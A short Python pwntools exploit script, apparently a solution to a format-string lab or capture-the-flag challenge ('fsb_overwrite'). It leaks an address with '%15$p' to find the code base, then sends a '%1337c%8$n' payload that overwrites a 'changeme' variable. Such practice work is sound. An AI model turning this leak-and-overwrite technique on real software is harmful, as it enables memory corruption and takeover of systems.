#!/usr/bin/python3

from pwn import *

p = process("./fsb_overwrite")
e = ELF("./fsb_overwrite")

buf = b'%15$p'
p.sendline(buf)
main = int(p.recvline()[:-1], 16)
code_base = main - 0x1293

changeme = code_base + e.symbols['changeme']

payload = b'%1337c'
payload += b'%8$n'
payload = payload.ljust(16, b'A')
payload += p64(changeme)

p.sendline(payload)

p.interactive()

